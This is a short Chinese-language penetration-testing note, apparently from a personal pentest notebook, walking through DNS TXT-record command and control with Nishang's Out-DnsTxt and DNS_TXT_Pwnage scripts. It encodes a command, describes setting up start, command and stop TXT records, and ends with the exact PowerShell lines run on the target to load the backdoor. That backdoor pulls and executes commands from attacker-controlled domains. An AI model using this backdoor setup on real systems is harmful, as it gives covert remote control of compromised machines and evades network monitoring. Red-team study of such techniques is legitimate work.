	https://github.com/samratashok/nishang/Utility/Out-DnsTxt.ps1
	https://github.com/samratashok/nishang/Backdoors/DNS_TXT_Pwnage.ps1
	新建一个psh文件，使用out-dnstxt转换，这里的命令是net user
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/201.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/202.png)

	y0stUSgtTi3i5QIA
	添加一条域名txt记录，这里在本地设置，正常是在域名商的网站里配置
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/203.png)

	还需创建两个txt记录，分别是指定开始和结束的字符串
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/204.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/205.png)

	靶机执行
	>Import-Module .\DNS_TXT_Pwnage.ps1
	>DNS_TXT_Pwnage -startdomain start.zone.com -cmdstring cmd -commanddomain 1.zone.com -psstring start -psdomain zone.com -Subdomains 1 -StopString stop
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/206.png)